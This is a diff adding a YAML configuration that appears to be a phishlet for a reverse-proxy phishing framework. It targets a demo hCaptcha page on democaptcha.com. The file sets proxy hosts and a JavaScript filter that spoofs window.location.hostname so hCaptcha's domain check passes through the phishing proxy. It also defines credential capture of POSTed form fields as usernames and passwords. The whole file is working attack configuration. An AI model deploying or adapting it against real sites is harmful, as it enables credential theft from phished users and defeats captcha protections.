@@ -1,0 +1,28 @@
+min_ver: '3.0.0'
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'democaptcha.com', session: true, is_landing: true, auto_filter: false}
+  - {phish_sub: 'hcaptcha', orig_sub: '', domain: 'hcaptcha.com', session: true, is_landing: false, auto_filter: false}
+
+sub_filters:
+  - {triggers_on: 'hcaptcha.com', orig_sub: '', domain: 'democaptcha.com', search: 'window.location.hostname', replace: 'window.location.hostname.replace("{hostname}", "{orig_hostname}")', mimes: ['application/javascript']}
+
+# Adding manual filters for democaptcha.com to avoid replacing the domain in the verification response view
+  - {triggers_on: 'democaptcha.com', orig_sub: '', domain: 'democaptcha.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html']}
+  - {triggers_on: 'democaptcha.com', orig_sub: '', domain: 'hcaptcha.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html']}
+
+
+auth_tokens:
+  - domain: 'democaptcha.com'
+    keys: []
+credentials:
+  username:
+    key: 'demo_text'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'demo_text'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'democaptcha.com'
+  path: '/demo-form-eng/hcaptcha.html'
